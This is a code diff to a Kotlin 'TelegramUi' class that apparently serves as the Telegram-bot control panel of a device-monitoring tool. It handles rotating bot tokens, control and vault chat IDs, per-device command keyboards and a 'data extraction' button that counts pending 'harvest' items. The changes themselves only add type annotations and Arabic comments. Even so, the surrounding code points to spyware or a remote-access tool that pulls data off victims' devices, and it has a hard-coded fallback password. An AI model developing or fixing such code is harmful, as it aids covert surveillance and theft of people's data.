@@ -45,12 +45,14 @@ class TelegramUi(
     private var heartbeatJob: Job? = null
     private var restartJob: Job? = null
 
-    private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
-    private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
+    // ✅ استخدام MutableList بشكل صريح مع مزامنة آمنة
+    private val activeTokensList: MutableList<String> = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
+    private val reserveTokensList: MutableList<String> = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
 
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
-    // ✅ تم تغيير val إلى var
+    
+    // ✅ تم تغيير val إلى var لحل خطأ "Val cannot be reassigned"
     private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: run {
         Log.w(TAG, "⚠️ Secret not found in config, using default password")
         "Zaen123@123@"
@@ -489,6 +491,7 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
+    // ✅ لوحة المفاتيح الرئيسية مع إيموجيات مختلفة لكل زر
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
@@ -508,6 +511,7 @@ class TelegramUi(
         }
     }
 
+    // ✅ لوحة مفاتيح الجهاز مع إيموجيات مختلفة لكل أمر
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
